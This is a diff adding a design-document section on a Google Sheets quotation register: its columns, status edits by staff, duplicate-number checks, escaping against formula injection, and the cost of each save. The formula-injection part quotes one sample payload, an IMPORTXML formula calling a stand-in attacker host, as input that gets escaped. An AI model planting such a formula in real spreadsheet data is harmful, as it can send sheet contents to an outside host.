@@ -318,6 +318,89 @@ comfortable against a ~50 MB practical POST limit.
 
 ---
 
+## The quotation register
+
+`TRACKING_SPREADSHEET_ID` points at the **Quotation Tracking** spreadsheet. The
+`Quotations` sheet is created on first use; nothing has to exist in advance, and
+**no sample row is ever written** (PRD §34).
+
+Columns A–H are exactly PRD §31, in the PRD's order. I–Q are system columns —
+they may be hidden and carry no business meaning of their own.
+
+| Col | Header | Source |
+| --- | ------------------ | ---------------------------------------------- |
+| A | Quotation No. | canonical `SFC/RUH/QTN/YYYY/NNN` — the unique key |
+| B | Date | quotation date, `DD-MM-YYYY`, as the document prints it |
+| C | Client Name | |
+| D | Company Name | |
+| E | Quotation For | |
+| F | Total Amount | **server-computed** grand total, SAR |
+| G | Status | `Pending` \| `Approved` \| `Rejected`, default `Pending` |
+| H | Drive Folder | `HYPERLINK` to the quotation folder |
+| I | PDF URL | Drive `webViewLink` |
+| J | DOCX URL | Drive `webViewLink` |
+| K | Subtotal | server-computed |
+| L | VAT Amount | server-computed |
+| M | Authorized Person | snapshot name |
+| N | Created By | user email |
+| O | Created At | ISO 8601 UTC, written once |
+| P | Updated At | ISO 8601 UTC, moves on every write |
+| Q | Draft ID | idempotency key — what makes a re-save update in place |
+
+### Staff may edit Status in the Sheet
+
+That is the V1 tracking mechanism (PRD §31, §17.5), and the app is built around
+it: a re-save **preserves** the current Status, so re-issuing a document never
+resets an `Approved` quotation to `Pending`, and the quotations list reads Status
+back from the Sheet rather than from its own copy.
+
+Two things follow. A Status typed by hand outside the three allowed values is a
+typed error on read, not something silently coerced — the row is skipped and
+logged rather than shown as `Pending`. And the column carries data validation so
+the typo is hard to make in the first place.
+
+### Uniqueness, in three layers
+
+1. The `Counters` sheet is the only issuer of a number (§7.4).
+2. A pre-append scan of column A rejects a number already held by a different
+   `Draft ID`, with `DUPLICATE_QUOTATION_NUMBER`. The scan and the append run in
+   ONE script lock, or two concurrent saves can both pass the check.
+3. A conditional-format rule highlights any duplicate introduced by hand.
+
+### Formula injection
+
+Every written value is escaped: a leading `=`, `+`, `-` or `@` gets a `'`
+prefix, so a client called `=IMPORTXML("https://attacker.example",…)` lands as
+inert text instead of running when someone opens the sheet.
+
+This is enforced by the TYPE SYSTEM, not by convention: `writeRow` accepts only
+`PreparedCell`, and the only way to obtain one is through `cell-escaping.ts`.
+
+The single formula this system writes is the Drive Folder `HYPERLINK`, built
+from a URL that must match `^https://drive\.google\.com/` with both arguments
+escaped. Anything else is written as plain text.
+
+### Cost per save
+
+Four `getRange` round trips, **constant regardless of how many rows the register
+holds** — two column scans, one `setValues` for the whole row, one read-back to
+confirm it landed. The row is written in a single call so it cannot half-succeed.
+
+Wall-clock against a real spreadsheet cannot be measured from this repository
+(the tests use an in-memory fake); what the fake does establish is that the cost
+does not grow with the register, which is the property that matters against the
+6-minute execution limit.
+
+### When the register write fails
+
+The documents are already in Drive at that point, so PRD §37 treats it as a
+WARNING, not a failed save. The upload response carries a `tracking` outcome, the
+UI shows "Saved to Drive, but not yet in the register", and **Retry Tracking**
+calls `quotation.recordTracking` — which re-reads the archive for the URLs and
+writes the row without re-sending two megabytes of documents.
+
+---
+
 ## Signature images
 
 `_assets/signatures/` is created on first upload, through the same folder
